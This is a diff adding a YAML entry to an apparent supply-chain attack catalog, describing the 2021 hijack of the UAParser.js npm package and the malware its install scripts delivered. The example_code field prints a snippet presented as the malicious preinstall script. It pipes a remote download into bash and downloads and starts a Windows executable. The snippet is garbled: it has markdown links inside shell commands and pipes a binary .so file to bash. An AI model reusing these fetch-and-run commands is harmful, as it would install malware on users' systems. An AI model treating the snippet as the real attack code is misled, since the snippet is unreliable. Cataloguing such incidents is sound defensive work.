@@ -1,0 +1,55 @@
+- name: UAParser.js
+  title: UAParser.js maintainer account compromised, malware distributed.
+  start_date: 2021-10-22
+  end_date: 2021-10-22
+  license: GPL-2.0 / MIT
+  website: https://github.com/faisalman/ua-parser-js
+  repo: https://github.com/faisalman/ua-parser-js
+  attribution_type: unknown
+  attribution: Attacker via faisalman's NPM account
+  component_type: Library
+  lang: Javascript, Shell
+  cause: compromise
+  motive: Cryptocurrency theft, Credential theft
+  attack_vector: Account takeover
+  transitive: false
+  insertion_phase: distribution
+  impact_type: Credential theft, Cryptomining
+  impact_user_count: 1260
+  references:
+    - https://github.com/faisalman/ua-parser-js/issues/536
+    - https://blog.sonatype.com/npm-project-ua-parser-js-hijacked-to-install-malware
+  versions:
+    - 0.7.29
+    - 0.8.0
+    - 1.0.0
+  artifacts:
+    - https://www.npmjs.com/package/ua-parser-js/v/0.7.29
+    - https://www.npmjs.com/package/ua-parser-js/v/0.8.0
+    - https://www.npmjs.com/package/ua-parser-js/v/1.0.0
+  synopsis: |
+    Malicious versions were published to NPM after the maintainer's account was hijacked. The package included install scripts downloading platform-specific malware.
+  compromise_desc: |
+    The NPM account of the library's maintainer, Faisal Salman, was compromised. The attacker published three new versions (0.7.29, 0.8.0, 1.0.0) containing malicious `preinstall.sh` scripts.
+  impact_desc: |
+    The malicious install scripts checked the OS. On Linux/macOS, it downloaded and ran the XMRig cryptominer. On Windows, it executed a batch script that attempted to steal various credentials (OS, browser cookies) and downloaded a Monero miner.
+  example_code: |
+    ```bash
+    # Snippet from malicious preinstall.sh script
+    os=`uname -s`
+    arch=`uname -m`
+    pwd > ~/pwd_lol
+    # Download and execute malware based on OS
+    if [ "$os" = "Linux" ]
+    then
+        curl -L [https://github.com/ytisf/the_great_work/raw/main/jsextension.so](https://github.com/ytisf/the_great_work/raw/main/jsextension.so) | bash # Downloads miner
+    elif [ "$os" = "Darwin" ]
+    then
+        curl -L [https://github.com/ytisf/the_great_work/raw/main/jsextension.so](https://github.com/ytisf/the_great_work/raw/main/jsextension.so) | bash # Downloads miner
+    elif [ "$os" = "Windows_NT" ]
+    then
+        # Downloads credential stealer/miner for Windows
+        powershell -Command "Invoke-WebRequest [https://github.com/ytisf/the_great_work/raw/main/jsextension.exe](https://github.com/ytisf/the_great_work/raw/main/jsextension.exe) -OutFile C:\Windows\Temp\jsextension.exe"; start C:\Windows\Temp\jsextension.exe
+    fi
+    # Additional commands to delete evidence were present
+    ```
